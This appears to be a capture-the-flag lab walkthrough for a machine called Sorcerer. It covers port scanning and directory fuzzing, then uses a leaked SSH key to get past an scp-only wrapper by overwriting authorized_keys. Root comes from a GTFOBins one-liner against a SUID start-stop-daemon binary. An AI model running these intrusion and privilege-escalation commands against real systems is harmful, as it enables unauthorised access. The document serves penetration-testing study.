## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.182.100
# HOSTNAME

# OPERATING SYSTEM

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp    open  ssh      syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     syn-ack ttl 61 nginx
111/tcp   open  rpcbind  syn-ack ttl 61 2-4 (RPC #100000)
2049/tcp  open  nfs      syn-ack ttl 61 3-4 (RPC #100003)
7742/tcp  open  http     syn-ack ttl 61 nginx
8080/tcp  open  http     syn-ack ttl 61 Apache Tomcat 7.0.4
33065/tcp open  nlockmgr syn-ack ttl 61 1-4 (RPC #100021)
35835/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
42329/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
43307/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
```
# ENUMERATION
```bash
# HTTP 80
80/tcp    open  http     syn-ack ttl 61 nginx
- Fuzzing files
sudo ffuf -c -w /usr/share/wordlists/dirb/common.txt -of md -o fuzz/ffuf-common -fc 403,404 -u $url/FUZZ
index.html              [Status: 200, Size: 14, Words: 3, Lines: 2, Duration: 35ms]


# HTTP 7742
7742/tcp  open  http     syn-ack ttl 61 nginx
- Fuzzing files
index.html              [Status: 200, Size: 1219, Words: 130, Lines: 65, Duration: 37ms]                                                                                                     
- Fuzzing Folders
default                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]          
zipfiles                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]    

- Found zipfile on http://192.168.182.100:7742/zipfiles/
../
francis.zip                                        24-Sep-2020 19:27                2834
max.zip                                            24-Sep-2020 19:27                8274
miriam.zip                                         24-Sep-2020 19:27                2826
sofia.zip                                          24-Sep-2020 19:27                2818

- Downloading and extracting all zipfiles

# HTTP 8080
8080/tcp  open  http     syn-ack ttl 61 Apache Tomcat 7.0.4
- Fuzzing files
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 36ms]
index.jsp               [Status: 200, Size: 11205, Words: 4210, Lines: 199, Duration: 36ms]
500.html                [Status: 200, Size: 716, Words: 61, Lines: 1, Duration: 37ms]
400.html                [Status: 200, Size: 738, Words: 67, Lines: 1, Duration: 35ms]
RELEASE-NOTES.txt       [Status: 200, Size: 6898, Words: 862, Lines: 175, Duration: 37ms]
RELEASE-NOTES.txt       [Status: 200, Size: 6898, Words: 862, Lines: 175, Duration: 36ms]    

- Fuzzing Folders
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]

# RPC
111/tcp   open  rpcbind  syn-ack ttl 61 2-4 (RPC #100000)

# NFS
2049/tcp  open  nfs      syn-ack ttl 61 3-4 (RPC #100003)
33065/tcp open  nlockmgr syn-ack ttl 61 1-4 (RPC #100021)
35835/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
42329/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
43307/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)

# SSH
22/tcp    open  ssh      syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

```
## INITIAL FOOTHOLD
```bash
- Found max user .ssh folder with private and pullic key
- use the keys to access via ssh
sudo ssh -i id_rsa max@$ip               
PTY allocation request failed on channel 0
ACCESS DENIED.
sudo ssh -i id_rsa max@$ip -T               
ACCESS DENIED.

- Found file scp_wrapper.sh inside max folder which we extracted
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac

- Seems like scp is allowed

- Generate a ssh key and copy to max .ssh/authorized_keys file
ssh-keygen -f myshell
sudo scp -O -i id_rsa ./myshell.pub max@$ip:/home/max/.ssh/authorized_keys

sudo ssh -i myshell max@$ip
max@sorcerer:~$ id
uid=1003(max) gid=1003(max) groups=1003(max)
```
## PRIVILEGE ESCALATION
```bash
# SUID
find / -perm -u=s -type f 2>/dev/null

- Found 
/usr/sbin/start-stop-daemon

# Reference GTFOBINS
/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Sat Nov 23 23:04:32 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.182.100
Nmap scan report for 192.168.182.100
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-11-23 23:04:35 IST for 29s
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBPvmCSxPzeOTu0xkhzki1lzln7PMGxSa5pj+POhWbtVKv4FPS1xWMPEoXGBP0mnepAfSnrPFIhT6VWp55a1Li5JZ6lhZnrXlCiGlmXACaBk27AHzN0/oyaOJ3K0i0QzU+WA0yrnYrxwUx9pOiHUHWeMqB2rR0s/qT/HVhIxsCcep3GcnlHZIq+/gDHE8vSE9S7NB0HveWjcK9dTfaGo1j43hexqvWu2HDoaivZASEVaLVuytRNuxncc42YG3+YVJdh0Rc7nzLJGYIZOMf/uL2cQuRnWyZ2cWYp18vKWqdGCx98sLGgvSgvyv8bKodTB3bEjBte67TjB+WH3PHLgwr
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBORL+pLKq3Yihns7IHsQga4FwiEEphsd69rkOSoXG9LpXW1EmBzwAuZsPsFMPybf/wD/1xv3WwXI18OW7KPH5zE=
|   256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+BGOga+rG532zlRWjwPOXuZpULndpYclKxi8sF5n8B
80/tcp    open  http     syn-ack ttl 61 nginx
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
111/tcp   open  rpcbind  syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      42329/tcp   mountd
|   100005  1,2,3      59704/udp   mountd
|   100021  1,3,4      33065/tcp   nlockmgr
|   100021  1,3,4      51595/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      syn-ack ttl 61 3-4 (RPC #100003)
7742/tcp  open  http     syn-ack ttl 61 nginx
|_http-title: SORCERER
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp  open  http     syn-ack ttl 61 Apache Tomcat 7.0.4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
33065/tcp open  nlockmgr syn-ack ttl 61 1-4 (RPC #100021)
35835/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
42329/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
43307/tcp open  mountd   syn-ack ttl 61 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

